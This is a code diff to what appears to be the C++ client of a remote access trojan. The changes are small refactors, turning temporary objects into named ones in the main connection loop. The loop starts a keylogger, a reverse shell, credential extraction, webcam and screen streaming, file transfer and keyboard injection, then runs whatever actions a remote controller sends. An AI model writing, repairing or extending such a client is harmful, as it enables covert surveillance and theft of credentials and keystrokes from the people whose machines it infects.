@@ -75,7 +75,6 @@ bool generate_sockets() {
             closesocket(sock);
             return false;
         }
-
         Stream stream(sock);
         stream.readString();
         nlohmann::json jsonObjet;
@@ -111,21 +110,22 @@ int main(int argc = 0, char *argv[] = nullptr) {
         keyLogger.tryStart();
         //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool isConnecting = true;
+
         bool streamListening = true;
         while (isConnecting) {
             nlohmann::json jsonObject;
             std::cout << "trying to connect " << std::endl;
             if (generate_sockets()) {
                 Stream stream = *get_connection("FILE_MANAGER");
-                FileManager(stream, actionMap);
+                FileManager fileManager(stream, actionMap);
                 stream = *get_connection("DOWNLOAD_UPLOAD");
-                Download(stream, actionMap);
+                Download download(stream, actionMap);
                 stream = *get_connection("REVERSE_SHELL");
                 ReverseShell reverseShell(stream, actionMap);
                 stream = *get_connection("KEYLOGGER");
                 keyLogger.setStream(stream);
                 stream = *get_connection("PERMISSION");
-                Permission(stream, actionMap);
+                Permission permission(stream, actionMap);
                 stream = *get_connection("WEBCAM");
                 DeviceEnumerator(stream, actionMap);
                 WebcamManager webcamManager(stream, actionMap);
@@ -133,18 +133,19 @@ int main(int argc = 0, char *argv[] = nullptr) {
                 Stream altStream = *get_connection("SCREEN_EVENT");
                 ScreenStreamer screenStreamer(stream, altStream, actionMap);
                 stream = *get_connection("CREDENTIALS");
-                CredentialsExtractor(stream, actionMap);
+                CredentialsExtractor credentialsExtractor(stream, actionMap);
                 stream = *get_connection("MAIN");
+                Information information(stream, actionMap);
                 MessageBoxGUI messageBoxGUI(stream, actionMap);
                 KeyboardExecuter keyboardExecuter(stream, actionMap);
-                Information(stream, actionMap);
-                ConnectionState(stream, actionMap, isConnecting, streamListening);
-                SystemState(stream, actionMap);
+                ConnectionState connectionState(stream, actionMap, isConnecting, streamListening);
+                SystemState systemState(stream, actionMap);
                 stream.sendString("ACK");
                 while (streamListening) {
                     jsonObject = nlohmann::json::parse(stream.readString());
                     std::string action = jsonObject["ACTION"];
                     std::cout << "Action: " << action << std::endl;
+
                     auto it = actionMap.find(action);
                     if (it != actionMap.end()) {
                         it->second(jsonObject);
